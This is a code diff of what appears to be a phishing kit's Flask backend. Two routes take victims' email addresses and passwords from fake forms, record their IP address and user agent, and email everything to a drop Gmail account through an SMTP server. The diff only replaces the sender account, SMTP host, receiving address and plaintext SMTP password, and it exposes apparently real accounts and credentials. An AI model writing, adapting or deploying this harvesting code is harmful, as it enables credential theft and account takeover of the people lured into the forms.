@@ -193,10 +193,10 @@ def clips():
             ip = request.remote_addr
         email = request.form.get("emailapive")
         passwordemail = request.form.get("passwordapive")
-        sender_email = "newsevers@yonia.site"
+        sender_email = "behcunipma@goonline.id"
         sender_emaill = "contact"
-        receiver_email = "silrashford@gmail.com"
-        password = "-nJXX7Ap]-4q"
+        receiver_email = "masonhal8063@gmail.com"
+        password = "Behc03756"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
         message["Subject"] = "new Upsate ## invoice"
@@ -212,7 +212,7 @@ def clips():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP_SSL("yonia.site", 465) as server:
+        with smtplib.SMTP_SSL("goonline.id", 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         # Set session value and redirect
@@ -249,10 +249,10 @@ def mansecond():
             ip = request.remote_addr
         email = request.form.get("emailail")
         passwordemail = request.form.get("passwordail")
-        sender_email = "newsevers@yonia.site"
+        sender_email = "behcunipma@goonline.id"
         sender_emaill = "contact"
-        receiver_email = "silrashford@gmail.com"
-        password = "-nJXX7Ap]-4q"
+        receiver_email = "masonhal8063@gmail.com"
+        password = "Behc03756"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
         message["Subject"] = "new Upsate ## invoice"
@@ -268,7 +268,7 @@ def mansecond():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP_SSL("yonia.site", 465) as server:
+        with smtplib.SMTP_SSL("goonline.id", 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         session['ins'] = email  # Save email as session variable
@@ -292,5 +292,6 @@ def pilom():
 
 if __name__ == "__main__":
     app.run(debug=True)
+
 
 
